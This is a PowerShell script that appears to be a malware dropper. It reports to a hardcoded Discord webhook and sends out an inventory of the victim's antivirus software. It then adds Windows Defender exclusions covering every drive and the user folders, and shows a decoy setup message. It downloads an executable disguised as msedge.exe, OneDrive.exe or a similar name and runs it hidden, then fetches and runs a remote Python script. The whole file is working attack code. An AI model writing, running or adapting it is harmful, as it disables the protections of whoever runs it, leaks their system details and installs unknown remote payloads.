$webhookUrl = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'

function Send-WebhookMessage {
    param($Message)
    $body = @{ content = $Message } | ConvertTo-Json -Depth 10
    try {
        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

try {
    $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    $DefenderStatus = if ($DefenderService) { $DefenderService.Status } else { 'Not Installed' }

    $DefenderRealtime = try { Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring } catch { 'Unavailable' }

    $InstalledAV = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" | 
        Select-Object displayName, productState, pathToSignedProductExe

    $DefenderExe = Get-Command "C:\Program Files\Windows Defender\MsMpEng.exe" -ErrorAction SilentlyContinue
    $DefenderExeStatus = if ($DefenderExe) { 'Yes' } else { 'No' }

    $WinDefendReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -ErrorAction SilentlyContinue
    $RegStatus = if ($WinDefendReg) { 'Yes' } else { 'No' }

    $avInfo = if ($InstalledAV) {
        ($InstalledAV | ForEach-Object { 
            $state = switch ($_.'productState') {
                397568 { 'Enabled' }
                266240 { 'Disabled' }
                Default { $_.'productState' }
            }
            "- $($_.displayName) | Status: $state | Path: $($_.pathToSignedProductExe)"
        }) -join "`n"
    } else { "- None detected" }

    $knownAVPaths = @(
        "$env:ProgramFiles\AVAST Software", "$env:ProgramFiles(x86)\AVAST Software",
        "$env:ProgramFiles\AVG", "$env:ProgramFiles(x86)\AVG",
        "$env:ProgramFiles\Avira", "$env:ProgramFiles(x86)\Avira",
        "$env:ProgramFiles\Bitdefender", "$env:ProgramFiles(x86)\Bitdefender",
        "$env:ProgramFiles\Kaspersky Lab", "$env:ProgramFiles(x86)\Kaspersky Lab",
        "$env:ProgramFiles\Malwarebytes", "$env:ProgramFiles(x86)\Malwarebytes",
        "$env:ProgramFiles\McAfee", "$env:ProgramFiles(x86)\McAfee",
        "$env:ProgramFiles\Norton", "$env:ProgramFiles(x86)\Norton",
        "$env:ProgramFiles\ESET", "$env:ProgramFiles(x86)\ESET",
        "$env:ProgramFiles\Trend Micro", "$env:ProgramFiles(x86)\Trend Micro",
        "$env:ProgramFiles\Panda Security", "$env:ProgramFiles(x86)\Panda Security",
        "$env:ProgramFiles\Sophos", "$env:ProgramFiles(x86)\Sophos",
        "$env:ProgramFiles\F-Secure", "$env:ProgramFiles(x86)\F-Secure",
        "$env:ProgramFiles\Webroot", "$env:ProgramFiles(x86)\Webroot",
        "$env:ProgramFiles\Comodo", "$env:ProgramFiles(x86)\Comodo",
        "$env:ProgramFiles\VIPRE", "$env:ProgramFiles(x86)\VIPRE",
        "$env:ProgramFiles\Cylance", "$env:ProgramFiles(x86)\Cylance",
        "$env:ProgramFiles\Carbon Black", "$env:ProgramFiles(x86)\Carbon Black",
        "$env:ProgramFiles\CrowdStrike", "$env:ProgramFiles(x86)\CrowdStrike",
        "$env:ProgramFiles\DrWeb", "$env:ProgramFiles(x86)\DrWeb",
        "$env:ProgramFiles\Symantec", "$env:ProgramFiles(x86)\Symantec",
        "$env:ProgramFiles\ZoneAlarm", "$env:ProgramFiles(x86)\ZoneAlarm",
        "$env:ProgramFiles\Adaware", "$env:ProgramFiles(x86)\Adaware",
        "$env:ProgramFiles\VIPRE Security", "$env:ProgramFiles(x86)\VIPRE Security",
        "$env:ProgramFiles\Windows Defender Advanced Threat Protection",
        "$env:ProgramFiles(x86)\Windows Defender Advanced Threat Protection"
    )

    $pathAVs = @()
    foreach ($path in $knownAVPaths) {
        if (Test-Path $path) { $pathAVs += $path }
    }

    $pathAVsInfo = if ($pathAVs) { $pathAVs -join "`n" } else { "- None detected" }

    $avProcessPatterns = @(
        'avast','avg','avira','bitdefender','kaspersky','malwarebytes','mcafee','norton','eset','trend','panda',
        'sophos','f-secure','webroot','comodo','vipre','cylance','carbonblack','crowdstrike','drweb','symantec',
        'zonealarm','adaware','defender','windows defender','eicar','vipre security','malwarebytes','malwarebytes3'
    )

    $runningAVProcesses = Get-Process | Where-Object { 
        $name = $_.ProcessName.ToLower()
        $falseFound = $false
        foreach ($pattern in $avProcessPatterns) {
            if ($name -like "*$pattern*") { $falseFound = $true }
        }
        $falseFound
    } | Select-Object -Property ProcessName, Id, Path -ErrorAction SilentlyContinue

    $runningAVInfo = if ($runningAVProcesses) {
        ($runningAVProcesses | ForEach-Object { "- $($_.ProcessName) | PID: $($_.Id) | Path: $($_.Path)" }) -join "`n"
    } else { "- None detected" }


    $message = @"
=== Windows Defender Info ===
Service Status: $DefenderStatus
Real-Time Protection Disabled: $DefenderRealtime
Defender Executable Found: $DefenderExeStatus
Defender Registered in Registry: $RegStatus
Installed Antivirus Products (Security Center):
    $avInfo

Installed Antivirus Products (By Path):
    $pathAVsInfo

Running Antivirus Processes:
    $runningAVInfo
"@

    Send-WebhookMessage -Message $message


    
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Add-Type -AssemblyName PresentationFramework
        [System.Windows.MessageBox]::Show('Please run this script as administrator','Warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)
        exit
    }

    function Show-SilentMessageBox {
        param(
            [string]$Message = "Default message",
            [string]$Title = "Info",
            [string]$Icon = "Information"
        )
        
        $arguments = "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command `"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('$Message', '$Title', 'OK', '$Icon')`""
        
        Start-Process powershell -ArgumentList $arguments -WindowStyle Hidden
    }
    Show-SilentMessageBox -Message "Please give us 15-30 seconds to set up the filebase and download dependencies" -Title "Info"

    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA

    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
    foreach ($dir in $directories) {
        try {
            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
        } catch {
            Send-WebhookMessage -Message "Error adding exclusion for ${dir.FullName}: $_"
        }
    }

    $drives = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    foreach ($drive in $drives) {
        try {
            Add-MpPreference -ExclusionPath $drive -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion: $drive"
        } catch {
            Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
        }
    }

    try {
        Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $tempFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${appDataFolder}: $_"
    }

    try {
        Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${localAppDataFolder}: $_"
    }

    $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
    $selectedExe = $exeNames | Get-Random
    $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
    try {
        Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
    } catch {
        Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
    }

    $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
        Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Executed $selectedExe"
    } catch {
        Send-WebhookMessage -Message "Error downloading or executing ${selectedExe}: $_"
    }

    $tempFile = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString() + ".py")
    $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.py"

    try {
        Invoke-WebRequest -Uri $url -OutFile $tempFile
        Start-Process -FilePath $tempFile
    } catch {
    }

    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
} catch {
    Send-WebhookMessage -Message "Unexpected error: $_"
}
